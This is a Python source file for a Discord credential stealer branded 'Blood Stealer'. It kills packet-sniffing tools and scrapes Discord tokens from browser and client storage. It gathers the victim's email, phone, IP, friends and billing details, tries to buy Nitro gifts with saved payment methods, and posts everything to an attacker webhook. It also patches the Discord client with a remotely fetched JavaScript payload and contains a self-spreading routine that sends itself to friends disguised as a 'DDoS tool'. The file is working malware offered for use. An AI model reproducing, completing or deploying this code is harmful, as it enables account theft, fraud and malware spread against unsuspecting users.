import requests
try:
    import os
except:
    os.system('pip install os')
    import os

try:
    from psutil import process_iter, NoSuchProcess, AccessDenied, ZombieProcess
except:
    os.system('pip install psutil')

try:     
    from psutil import process_iter, NoSuchProcess, AccessDenied, ZombieProcess   
    class scare:
        def fuck(names):
            for proc in process_iter():
                try:
                    for name in names:
                        if name.lower() in proc.name().lower():
                            proc.kill()
                except (NoSuchProcess, AccessDenied, ZombieProcess):
                    pass
        def crow():
            forbidden = ['http', 'traffic', 'wireshark', 'fiddler', 'packet']
            return scare.fuck(names=forbidden)
    scare.crow()
except:
    pass


if os.name != "nt":
    exit()
 
import requests
 
import os
 
if os.name != "nt":
    exit()
from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from threading import Thread
from time import sleep
from sys import argv
import shutil
import psutil

WEBHOOK_URL = "%//WEBHOOK//%"

LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord"           : ROAMING + "\\Discord",
    "Discord Canary"    : ROAMING + "\\discordcanary",
    "Discord PTB"       : ROAMING + "\\discordptb",
    "Google Chrome"     : LOCAL + r"\\Google\\Chrome\\User Data\\Default",
    "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
    "Opera GX"          : ROAMING + "\\Opera Software\\Opera GX Stable",
    "Brave"             : LOCAL + r"\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex"            : LOCAL + r"\\Yandex\\YandexBrowser\\User Data\\Default"
}

pcname = os.getlogin()
path = r'C:\\Users\\'+pcname+'\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'

def getHeader(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
    }
    if token:
        headers.update({"Authorization": token})
    return headers


def getUserData(token):
    try:
        return loads(
            urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getHeader(token))).read().decode())
    except:
        pass


def getTokenz(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens


def whoTheFuckAmI():
    ip = "None"
    try:
        ip = urlopen(Request("https://ifconfig.me")).read().decode().strip()
    except:
        pass
    return ip


def hWiD():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]


def getFriends(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships",
                                     headers=getHeader(token))).read().decode())
    except:
        pass


def getChat(token, uid):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getHeader(token),
                                     data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
    except:
        pass


def paymentMethods(token):
    try:
        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources",
                                              headers=getHeader(token))).read().decode())) > 0)
    except:
        pass


def sendMessages(token, chat_id, form_data):
    try:
        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getHeader(token,
                                                                                                         "multipart/form-data; boundary=---------------------------325414537030329320151394843687"),
                        data=form_data.encode())).read().decode()
    except:
        pass

friend_count = 0

def spread(token, form_data, delay):

    return  # Remove to re-enabled (If you remove this line, malware will spread itself by sending the binary to friends.)
    try:
        chat_id = getChat(token, friend["id"])
        sendMessages(token, chat_id, form_data)
    except Exception as e:
        pass
        sleep(delay)

def getavatar(user, avatar):
    url = f"https://cdn.discordapp.com/avatars/{user}/{avatar}.gif"
    try:
        urlopen(Request(url))
    except:
        url = url[:-4]
    return url
def has_payment_methods(token):
    try:
        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v9/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
    except:
        pass


def RareFriend(token):
    friends = ""
    try:
        req = requests.get("https://discord.com/api/v9/users/@me/relationships", headers={"content-type": "application/json", "authorization": token}).json()
    
        for user in req:

            badge = ""
            if user["user"]["public_flags"] == 1:badge = "Staff"
            elif user["user"]["public_flags"] == 2:badge = "Partner"
            elif user["user"]["public_flags"] == 4:badge = "Hypesquad Events"
            elif user["user"]["public_flags"] == 8:badge = "BugHunter 1"
            elif user["user"]["public_flags"] == 512:badge = "Early"
            elif user["user"]["public_flags"] == 16384:badge = "BugHunter 2"
            elif user["user"]["public_flags"] == 131072:badge = "Developer"
            else:badge = ""
                
            if badge != "":friends += badge + " | " + user['id'] + "\n"            
        if friends == "":friends += "No Rare Friends"            
        return friends
    except:return "None"

def buy_nitro(token):
    try:
        r = requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token})
        if r.status_code == 200:
            payment_source_id = r.json()[0]['id']
            if '"invalid": ture' in r.text:
                r = requests.post(f'https://discord.com/api/v6/store/skus/521847234246082599/purchase', headers={'Authorization': token}, json={'expected_amount': 1,'gift': True,'payment_source_id': payment_source_id})   
                return r.json()['gift_code']
    except:return "None"


rare_badge = " "
hypesquad = " "
cc_type = "<a:no:787058320585261098>"


def a():
    for proc in psutil.process_iter():
        if any(procstr in proc.name() for procstr in\
        ['discord', 'Discord', 'DISCORD',]):
            proc.kill()
    for root, dirs, files in os.walk(os.getenv("LOCALAPPDATA")):
        for name in dirs:
            if (name.__contains__("discord_desktop_core-")):
                try:
                    directory_list = os.path.join(root, name+"\\discord_desktop_core\\index.js")
                    os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Blood"))
                    f = urlopen("https://raw.githubusercontent.com/loris59200/blood-api/main/blood-payload.js")
                    index_content = f.read()
                    with open(directory_list, 'wb') as index_file:
                        index_file.write(index_content)
                    with open(directory_list, 'r+') as index_file2:
                        replace_string = index_file2.read().replace("%WEBHOOK_LINK%", WEBHOOK_URL)
                    with open(directory_list, 'w'): pass
                    with open(directory_list, 'r+') as index_file3:
                        index_file3.write(replace_string)
                except Exception:
                    pass
    for root, dirs, files in os.walk(os.getenv("APPDATA")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc"):
        for name in files:
            discord_file = os.path.join(root, name)
            os.startfile(discord_file)

def main():
    global hypesquad
    global rare_badge
    global token
    friend_count = 0
    global cc_type
    cache_path = ROAMING + "\\.cache~$"
    prevent_spam = True
    self_spread = True
    embeds = []
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    ip = whoTheFuckAmI()
    pc_username = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")
    user_path_name = os.getenv("userprofile").split("\\")[2]
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in getTokenz(path):
            if token in checked:
                continue
            checked.append(token)
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode()
                except:
                    pass
                if not uid or uid in working_ids:
                    continue
            user_data = getUserData(token)
            if not user_data:
                continue

            try:   
                for x in requests.get('https://discordapp.com/api/v6/users/@me/billing/payment-sources', headers=getHeader(token)).json(): 
                    if x['type'] == 1:
                        cc_type = "<:credit:_card:942055615365263400>"
                    if x['type'] == 2:
                        cc_type = ":credit_card:`PayPal`:credit_card:"
                    else:
                        cc_type = "<a:no:787058320585261098>"
            except:
                cc_type = ":question:"

            working_ids.append(uid)
            working.append(token)
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            user_id = user_data["id"]
            email = user_data.get("email")
            avatar_id = user_data["avatar"]
            avatar_url = getavatar(user_id, avatar_id)
            phone = user_data.get("phone")
            badge = user_data.get("badge")
            for friend in getFriends(token):
                friend_count = friend_count + 1

            try:
                nitro = bool(user_data.get("premium_type"))
                if user_data['premium_type'] == 1:
                    nitro_type = "<a:nitro:892130462024224838>"
                elif user_data['premium_type'] == 2:
                    nitro_type =  "<a:Nitro:933799457424834590>"
                else:
                    return
            except:
                nitro_type = ":question:"

            nnitro_buyed = buy_nitro(token)
            if nnitro_buyed == None:nitro_buyed = f"<a:859607963945795594:923305308560973834>"
            else:nitro_buyed = f"<a:859606118702645278:923305304492474408> | [Redeem](https://discord.gift/{nnitro_buyed})" 


            if user_data['public_flags'] == 4:
                hypesquad = "<a:hypesquad:871074500190556211>"
            elif user_data['public_flags'] == 256:
                hypesquad =  "<a:balance:942379701895299133>"
            elif user_data['public_flags'] == 128:
                hypesquad =  "<a:Brilliance:942377602780393483>"
            elif user_data['public_flags'] == 64:
                hypesquad =  "<a:bravery:942377046041051156>"
            else:
                return

            flag = user_data.get('flags')
            billing = bool(paymentMethods(token))
            embed = {
                "color": 000000,
                "fields": [
                    {
                        "name": "<:unlock:941221024748437524> | Token :",
                        "value": f'`{str(token)}`\n[Click to copy](https://superfurrycdn.nl/copy/'+str(token)+')',
                        "inline": False
                    },
                    {
                        "name": "<a:satanist:802503618972483615> | Username",
                        "value": f'`{str(username)}`',
                        "inline": True
                    },
                    {
                        "name": ":envelope_with_arrow: | Email",
                        "value": f'`{str(email)}`',
                        "inline": True
                    },
                    {
                        "name": "<a:rozetler:821125778875875342> | Badges",
                        "value": f'{str(nitro_type)}',
                        "inline": True
                    },
                    {
                        "name": ":dart: | IP",
                        "value": f'`{whoTheFuckAmI()}`',
                        "inline": True
                    },
                    {
                        "name": "<a:gifstorydiscordemoji:752948250012811365> | Billing",
                        "value": f'{str(cc_type)}',
                        "inline": True
                    },
                    {
                        "name": ":hugging: | Friends",
                        "value": f'`{int(friend_count)}`',
                        "inline": True
                    }
                ],
                "author": {
                    "name": f"{username} ({user_id})",
                    "icon_url": avatar_url
                },
                "thumbnail": {
                    "url": "https://cdn.discordapp.com/attachments/942097248668500050/942765074731401236/9e091f0c777850f70faba8e9a03dba9e.jpg"
                },
                "footer": {
                    "text": f"Blood Stealer"
                }
            }
            embeds.append(embed)

            embed_hq = {
                "color": 000000,
                "fields": [
                    {
                        "name": "<a:early_supporter:920668235492368404> | HQ Friends",
                        "value": f'`{RareFriend(token)}`',
                        "inline": True
                    },
                    {
                            "name": "<a:gifland_boost:929879904147894282> | Nitro Gift",
                            "value": f"`Link :` {nitro_buyed}"
                    }
                ],
                "author": {
                    "name": f"{username} ({user_id})",
                    "icon_url": avatar_url
                },
                "thumbnail": {
                    "url": "https://cdn.discordapp.com/attachments/942097248668500050/942765074731401236/9e091f0c777850f70faba8e9a03dba9e.jpg"
                },
                "footer": {
                    "text": f"Blood Stealer"
                }
            }
            embeds.append(embed_hq)

    with open(cache_path, "a") as file:
        for token in checked:
            if not token in already_cached_tokens:
                file.write(token + "\n")
    if len(working) == 0:
        working.append('123')
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "Blood Stealer",
        "avatar_url": "https://cdn.discordapp.com/attachments/921559892408549426/942042298420723712/9e091f0c777850f70faba8e9a03dba9e.jpg"
    }
    try:
        
        urlopen(Request(webhook_url, data=dumps(webhook).encode(), headers=getheaders()))

    except Exception as e:
        pass
    if self_spread:
        for token in working:
            with open(argv[0], encoding="utf-8") as file:
                content = file.read()
            payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nDDoS tool. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
            Thread(target=spread, args=(token, payload, 7500 / 1000)).start()


try:
    main()
    a()
except:
    a()
    main()
